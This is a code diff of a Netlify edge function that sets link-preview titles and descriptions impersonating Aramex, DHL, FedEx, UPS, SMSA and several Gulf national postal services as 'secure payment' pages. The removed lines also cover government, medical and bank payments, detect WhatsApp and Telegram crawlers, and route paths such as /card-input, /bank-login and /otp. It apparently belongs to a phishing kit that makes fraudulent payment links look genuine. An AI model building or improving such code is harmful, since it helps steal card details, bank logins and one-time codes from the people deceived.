@@ -2,259 +2,131 @@ import { Context } from "https://edge.netlify.com";
 
 const companyMeta: Record<string, { title: string; description: string; image: string }> = {
   aramex: {
-    title: "دفع آمن - أرامكس للشحن السريع 🚚",
-    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
+    title: "دفع آمن - أرامكس للشحن السريع",
+    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة",
     image: "/og-aramex.jpg"
   },
   dhl: {
-    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
-    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍",
+    title: "دفع آمن - DHL الشحن العالمي السريع",
+    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة",
     image: "/og-dhl.jpg"
   },
   fedex: {
-    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
-    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰",
+    title: "دفع آمن - FedEx الشحن الدولي الموثوق",
+    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول",
     image: "/og-fedex.jpg"
   },
   ups: {
-    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
-    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍",
+    title: "دفع آمن - UPS للشحن والتوصيل العالمي",
+    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية",
     image: "/og-ups.jpg"
   },
   smsa: {
-    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
-    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦",
+    title: "دفع آمن - SMSA Express سمسا إكسبرس",
+    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة",
     image: "/og-smsa.jpg"
   },
   naqel: {
-    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
-    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡",
+    title: "دفع آمن - ناقل إكسبريس للشحن",
+    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن",
     image: "/og-naqel.jpg"
   },
   zajil: {
-    title: "دفع آمن - زاجل للشحن السريع 📮",
-    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦",
+    title: "دفع آمن - زاجل للشحن السريع",
+    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية",
     image: "/og-zajil.jpg"
   },
   saudipost: {
-    title: "دفع آمن - البريد السعودي 🇸🇦",
-    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦",
+    title: "دفع آمن - البريد السعودي",
+    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع",
     image: "/og-saudipost.jpg"
   },
   empost: {
-    title: "دفع آمن - البريد الإماراتي 🇦🇪",
-    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨",
+    title: "دفع آمن - البريد الإماراتي",
+    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن",
     image: "/og-empost.jpg"
   },
   qpost: {
-    title: "دفع آمن - البريد القطري 🇶🇦",
-    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍",
+    title: "دفع آمن - البريد القطري",
+    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة",
     image: "/og-qpost.jpg"
   },
   kwpost: {
-    title: "دفع آمن - البريد الكويتي 🇰🇼",
-    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅",
+    title: "دفع آمن - البريد الكويتي",
+    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل",
     image: "/og-kwpost.jpg"
   },
   omanpost: {
-    title: "دفع آمن - البريد العُماني 🇴🇲",
-    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮",
+    title: "دفع آمن - البريد العُماني",
+    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل",
     image: "/og-omanpost.jpg"
   },
   bahpost: {
-    title: "دفع آمن - البريد البحريني 🇧🇭",
-    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
+    title: "دفع آمن - البريد البحريني",
+    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة",
     image: "/og-bahpost.jpg"
   },
-  chalets: {
-    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
-    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
-    image: "/og-chalets.jpg"
-  },
-  contracts: {
-    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
-    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
-    image: "/og-contracts.jpg"
-  },
-  invoices: {
-    title: "دفع آمن - الفواتير والمستحقات 📋",
-    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
-    image: "/og-invoices.jpg"
-  },
-  government_payment: {
-    title: "دفع آمن - الخدمات الحكومية 🏛️",
-    description: "دفع الخدمات والرسوم الحكومية - سدد رسومك الحكومية إلكترونياً بأمان تام مع سداد، بنفت، مدى وجميع أنظمة الدفع الحكومية المعتمدة ✅",
-    image: "/og-government_payment.jpg"
-  },
-  health_links: {
-    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
-    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
-    image: "/og-health_links.jpg"
-  },
-  local_payment: {
-    title: "دفع آمن - المدفوعات المحلية 💳",
-    description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
-    image: "/og-local_payment.jpg"
-  },
-  bank_pages: {
-    title: "دفع آمن - البنوك الخليجية 🏦",
-    description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
-    image: "/og-bank_pages.jpg"
-  },
   default: {
-    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
-    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
+    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج",
+    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية",
     image: "/og-aramex.jpg"
   }
 };
 
 export default async (request: Request, context: Context) => {
-  try {
-    const url = new URL(request.url);
-    const userAgent = request.headers.get("user-agent") || "";
-    
-    // Detect if request is from WhatsApp or other social media crawlers
-    const isCrawler = /WhatsApp|facebookexternalhit|Twitterbot|TelegramBot|LinkedInBot|Slackbot/i.test(userAgent);
-    
-    // Log request details for debugging
-    console.log(`[Dynamic Meta] Request URL: ${url.href}`);
-    console.log(`[Dynamic Meta] User-Agent: ${userAgent.substring(0, 50)}...`);
-    console.log(`[Dynamic Meta] Is Crawler: ${isCrawler}`);
-    
-    const acceptHeader = request.headers.get("accept") || "";
-    if (!acceptHeader.includes("text/html")) {
-      return context.next();
-    }
-
-    const response = await context.next();
-    const contentType = response.headers.get("content-type") || "";
-    
-    if (!contentType.includes("text/html")) {
-      return response;
-    }
-
-    let html = await response.text();
-
-    // Extract company parameter from URL
-    const companyParam = url.searchParams.get("company") || url.searchParams.get("service") || "default";
-    const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
-    
-    // Use current domain (Netlify) instead of GitHub CDN for reliability and speed
-    const origin = url.origin;
-    const fullImageUrl = `${origin}${meta.image}`;
-    const fullUrl = url.href;
-
-    console.log(`[Dynamic Meta] Company: ${companyParam}, Image: ${fullImageUrl}`);
-
-    // Replace both placeholder syntax and actual meta tags
-    const metaUpdates = [
-      { pattern: /<title>[^<]*<\/title>/gi, replacement: `<title>${meta.title}</title>` },
-      { pattern: /<meta\s+name="description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="description" content="${meta.description}"/>` },
-      { pattern: /<meta\s+property="og:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:title" content="${meta.title}"/>` },
-      { pattern: /<meta\s+property="og:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:description" content="${meta.description}"/>` },
-      { pattern: /<meta\s+property="og:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image" content="${fullImageUrl}"/>` },
-      { pattern: /<meta\s+property="og:url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:url" content="${fullUrl}"/>` },
-      { pattern: /<meta\s+property="og:image:secure_url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:secure_url" content="${fullImageUrl}"/>` },
-      { pattern: /<meta\s+property="og:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:alt" content="${meta.title}"/>` },
-      { pattern: /<meta\s+name="twitter:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:title" content="${meta.title}"/>` },
-      { pattern: /<meta\s+name="twitter:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:description" content="${meta.description}"/>` },
-      { pattern: /<meta\s+name="twitter:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image" content="${fullImageUrl}"/>` },
-      { pattern: /<meta\s+name="twitter:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image:alt" content="${meta.title}"/>` },
-      // Replace placeholders
-      { pattern: /\{\{OG_TITLE\}\}/gi, replacement: meta.title },
-      { pattern: /\{\{OG_DESCRIPTION\}\}/gi, replacement: meta.description },
-      { pattern: /\{\{OG_IMAGE\}\}/gi, replacement: fullImageUrl },
-      { pattern: /\{\{OG_URL\}\}/gi, replacement: fullUrl },
-    ];
-
-    // Apply all meta tag updates
-    let replacementCount = 0;
-    for (const update of metaUpdates) {
-      const beforeLength = html.length;
-      html = html.replace(update.pattern, update.replacement);
-      if (html.length !== beforeLength) {
-        replacementCount++;
-      }
-    }
-    
-    console.log(`[Dynamic Meta] Replaced ${replacementCount} meta tags`);
-
-    // Ensure og:url exists
-    if (!html.includes('property="og:url"') && !html.includes("property='og:url'")) {
-      html = html.replace(
-        /<head>/i,
-        `<head>\n    <meta property="og:url" content="${fullUrl}"/>`
-      );
-    }
-
-    // Ensure og:image:secure_url exists
-    if (!html.includes('property="og:image:secure_url"') && !html.includes("property='og:image:secure_url'")) {
-      html = html.replace(
-        /<meta property="og:image"/i,
-        `<meta property="og:image:secure_url" content="${fullImageUrl}"/>\n    <meta property="og:image"`
-      );
-    }
-    
-    // Fallback: If no OG tags were found in HTML, inject them all at the beginning of <head>
-    if (replacementCount === 0) {
-      console.log(`[Dynamic Meta] No existing meta tags found, injecting new ones`);
-      const metaTags = `
-    <!-- Dynamic Meta Tags - Injected by Edge Function -->
-    <title>${meta.title}</title>
-    <meta name="description" content="${meta.description}"/>
-    <meta property="og:type" content="website"/>
-    <meta property="og:site_name" content="نظام الدفع الآمن"/>
-    <meta property="og:locale" content="ar_AR"/>
-    <meta property="og:url" content="${fullUrl}"/>
-    <meta property="og:title" content="${meta.title}"/>
-    <meta property="og:description" content="${meta.description}"/>
-    <meta property="og:image" content="${fullImageUrl}"/>
-    <meta property="og:image:secure_url" content="${fullImageUrl}"/>
-    <meta property="og:image:width" content="1200"/>
-    <meta property="og:image:height" content="630"/>
-    <meta property="og:image:type" content="image/jpeg"/>
-    <meta property="og:image:alt" content="${meta.title}"/>
-    <meta name="twitter:card" content="summary_large_image"/>
-    <meta name="twitter:title" content="${meta.title}"/>
-    <meta name="twitter:description" content="${meta.description}"/>
-    <meta name="twitter:image" content="${fullImageUrl}"/>
-    <meta name="twitter:image:alt" content="${meta.title}"/>
-`;
-      html = html.replace(/<head>/i, `<head>${metaTags}`);
-    }
-
-    // Return modified HTML with strict no-cache headers for WhatsApp/social crawlers
-    return new Response(html, {
-      headers: {
-        "content-type": "text/html; charset=utf-8",
-        "cache-control": "no-cache, no-store, must-revalidate, max-age=0, s-maxage=0",
-        "pragma": "no-cache",
-        "expires": "0",
-        "x-dynamic-meta": companyParam,
-        "x-company-param": companyParam,
-        "x-image-url": fullImageUrl,
-        "vary": "Accept, User-Agent"
-      }
-    });
-  } catch (error) {
-    console.error('[Dynamic Meta] Error:', error);
+  const url = new URL(request.url);
+  
+  const companyParam = url.searchParams.get("company") || url.searchParams.get("service");
+  if (!companyParam) {
     return context.next();
   }
+
+  const response = await context.next();
+  let html = await response.text();
+
+  const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
+  const origin = url.origin;
+  const imageUrl = `${origin}${meta.image}`;
+
+  html = html.replace(
+    /<meta property="og:title" content="[^"]*"/,
+    `<meta property="og:title" content="${meta.title}"`
+  );
+  html = html.replace(
+    /<meta property="og:description" content="[^"]*"/,
+    `<meta property="og:description" content="${meta.description}"`
+  );
+  html = html.replace(
+    /<meta property="og:image" content="[^"]*"/g,
+    `<meta property="og:image" content="${imageUrl}"`
+  );
+  html = html.replace(
+    /<meta property="og:image:secure_url" content="[^"]*"/,
+    `<meta property="og:image:secure_url" content="${imageUrl}"`
+  );
+  html = html.replace(
+    /<meta property="og:url" content="[^"]*"/,
+    `<meta property="og:url" content="${url.href}"`
+  );
+  html = html.replace(
+    /<meta name="twitter:image" content="[^"]*"/,
+    `<meta name="twitter:image" content="${imageUrl}"`
+  );
+  html = html.replace(
+    /<meta name="twitter:title" content="[^"]*"/,
+    `<meta name="twitter:title" content="${meta.title}"`
+  );
+  html = html.replace(
+    /<meta name="twitter:description" content="[^"]*"/,
+    `<meta name="twitter:description" content="${meta.description}"`
+  );
+
+  return new Response(html, {
+    headers: {
+      "content-type": "text/html; charset=utf-8",
+      "cache-control": "public, max-age=0, must-revalidate"
+    }
+  });
 };
 
-// Edge function configuration - match all HTML pages
-export const config = {
-  path: [
-    "/",
-    "/r/*",
-    "/pay/*",
-    "/payment-data/*",
-    "/recipient/*",
-    "/details/*",
-    "/card-input/*",
-    "/bank-selector/*",
-    "/bank-login/*",
-    "/otp/*",
-    "/receipt/*"
-  ],
-};
+export const config = { path: ["/*"] };
